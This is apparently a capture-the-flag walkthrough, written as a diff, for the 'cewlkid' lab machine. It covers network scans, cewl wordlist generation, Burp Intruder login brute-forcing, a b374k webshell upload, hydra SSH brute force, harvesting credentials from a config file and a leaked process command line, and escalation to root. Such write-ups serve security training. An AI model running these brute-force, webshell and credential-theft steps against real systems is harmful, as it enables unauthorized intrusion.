@@ -1,0 +1,171 @@
+[*] 
+1. find host: nmap 192.168.56.0/24 -sn
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-05 12:08 CST
+Nmap scan report for 192.168.56.108
+
+[*] 
+2. Scan host: nmap 192.168.56.108 -sS
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-proxy
+
+
+[*] Service scan: 
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+8080/tcp open  http    nginx 1.18.0 (Ubuntu)
+
+[*] 
+4. Web scan(80): dirb http://192.168.56.108/ | grep 'CODE' && nikto -h 192.168.56.108
++ http://192.168.56.108/index.html (CODE:200|SIZE:10918)                                          
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.56.108
++ Target Hostname:    192.168.56.108
++ Target Port:        80
++ Start Time:         2021-01-05 12:11:25 (GMT-6)
+---------------------------------------------------------------------------
++ Server: nginx/1.18.0 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ 7915 requests: 0 error(s) and 3 item(s) reported on remote host
++ End Time:           2021-01-05 12:11:34 (GMT-6) (9 seconds)
+
+[*]
+5. Note: Only thing present on this is the default "it works" page. The server version does not appear to be vulnerable.
+
+[*]
+6. Web scan(8080): dirb http://192.168.56.108:8080/ | grep CODE && nikto -h 192.168.56.108 -p 8080
++ http://192.168.56.108:8080/favicon.ico (CODE:200|SIZE:1150)                                     
++ http://192.168.56.108:8080/index.html (CODE:200|SIZE:152)                                       
++ http://192.168.56.108:8080/index.php (CODE:200|SIZE:8178)                                       
++ http://192.168.56.108:8080/files/images/info.php (CODE:200|SIZE:70076)                          
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.56.108
++ Target Hostname:    192.168.56.108
++ Target Port:        8080
++ Start Time:         2021-01-05 12:31:10 (GMT-6)
+---------------------------------------------------------------------------
++ Server: nginx/1.18.0 (Ubuntu)
++ Cookie SMSESSION6b631023323ea9ab created without the httponly flag
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Multiple index files found: /index.html, /index.php
++ Cookie SMSESSION54363a846aa5db6e created without the httponly flag
++ Cookie SMSESSION5656779dacdb70fe created without the httponly flag
++ Cookie SMSESSIONac5aa92b22da1326 created without the httponly flag
++ Cookie SMSESSIONc68bbe44a391970c created without the httponly flag
++ OSVDB-3092: /license.txt: License file found may identify site software.
++ /package.json: Node.js package file found. It may contain sensitive information.
+
+[*]
+7. Check into CMS: There were no real hints as far as comments. But, the name of the box is named after the tool cewl. So I decided to give password-cracking a go.
+
+[*]
+8. Generate list: cewl -d 5 -m 6 -w pass.txt
+**this generates a list with words 6 or greater characters that exist upto 5 links deep on the webpage.
+
+[*]
+9. Password cracking. I used the burp proxy for simplicity. That and the list is only 108 lines long (burp is single threaded if you have community editon). 
+Navigate to the login page, and submit a login.
+Navigate to 'history' in burp
+Right-click and sent to intruder
+Clear symbols
+create symbol for the password field in the POST 'password='
+Load payload of pass.txt
+attack
+[*]
+10. Password Letraset was found for user admin. I uploaded the b374k webshell 
+https://github.com/b374k/b374k
+http://192.168.56.108:8080/files/images/myShell.php
+[*]
+11. Found db password: config.xml.php
+<!-- REQUIRED, throws custom exception if missing -->
+	<entry key="Username" value="admin"/>
+<!-- REQUIRED, throws custom exception if missing -->
+	<entry key="Password" value="Letraset"/>
+[*]
+12. Grabbed users: cat /etc/passwd | grep /bin/bash | cut -d ':' -f1
+root
+www-data
+kidcewl
+ipsum
+lorem
+zerocewl
+cewlbeans
+
+[*]
+13. SSH bruteforce: hydra -L users.txt -P pass.txt ssh://192.168.56.108 -t 4
+22][ssh] host: 192.168.56.108   login: zerocewl   password: PageMaker
+
+[*]
+14. Enumerate new account: 
+ssh zerocewl@192.168.56.108
+sudo -l
+sudo -l
+Matching Defaults entries for zerocewl on cewlkid:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User zerocewl may run the following commands on cewlkid:
+    (root : root) NOPASSWD: /usr/bin/cp /home/zerocewl/hosts /etc/hosts
+
+[*]
+15. Checking hint:
+cat hosts
+127.0.0.1 localhost
+127.0.1.1 cewlkid
+192.168.86.109  kali
+
+[*]
+16. Catch connections going to kali:
+for i in $(seq 1 255); do netstat | grep kali; sleep 1; done
+tcp        0      0 cewlkid:38798             kali:smb      ESTABLISHED
+tcp        0      0 cewlkid:38798             kali:netbios  ESTABLISHED
+
+[*] 
+17. View running processes that are making that connection: pspy64
+
+2021/01/05 21:57:01 CMD: UID=0    PID=299675 | /root/pth-toolkit-master/bin/winexe -U cewlbeans%fondateurs //kali whoami
+
+[*]
+18. Login, and enumerate new user
+ssh cewlbeans@192.168.56.108
+sudo -l
+User cewlbeans may run the following commands on cewlkid:
+    (ALL : ALL) ALL
+Our work here is done!!
+
+[*]
+19. Get flag: 
+sudo su -
+cat flag.txt
+        ______  ___________    __    ____  __       __  ___  __   _______                    
+       /      ||   ____\   \  /  \  /   / |  |     |  |/  / |  | |       \                   
+      |  ,----'|  |__   \   \/    \/   /  |  |     |  '  /  |  | |  .--.  |                  
+      |  |     |   __|   \            /   |  |     |    <   |  | |  |  |  |                  
+      |  `----.|  |____   \    /\    /    |  `----.|  .  \  |  | |  '--'  |                  
+       \______||_______|   \__/  \__/     |_______||__|\__\ |__| |_______/                   
+                                                                                             
+                  .______        ______     ______   .___________.                           
+                  |   _  \      /  __  \   /  __  \  |           |                           
+                  |  |_)  |    |  |  |  | |  |  |  | `---|  |----`                           
+                  |      /     |  |  |  | |  |  |  |     |  |                                
+                  |  |\  \----.|  `--'  | |  `--'  |     |  |                                
+                  | _| `._____| \______/   \______/      |__|                                
+                                                                                             
+.______      .___  ___. ___   ___  __    __   ________  ____    __    ____  ______           
+|   _  \     |   \/   | \  \ /  / |  |  |  | |       /  \   \  /  \  /   / /  __  \   ______ 
+|  |_)  |    |  \  /  |  \  V  /  |  |__|  | `---/  /    \   \/    \/   / |  |  |  | |______|
+|      /     |  |\/|  |   >   <   |   __   |    /  /      \            /  |  |  |  |  ______ 
+|  |\  \----.|  |  |  |  /  .  \  |  |  |  |   /  /----.   \    /\    /   |  `--'  | |______|
+| _| `._____||__|  |__| /__/ \__\ |__|  |__|  /________|    \__/  \__/     \______/          
+
+rmxhzwo= translates to: flag
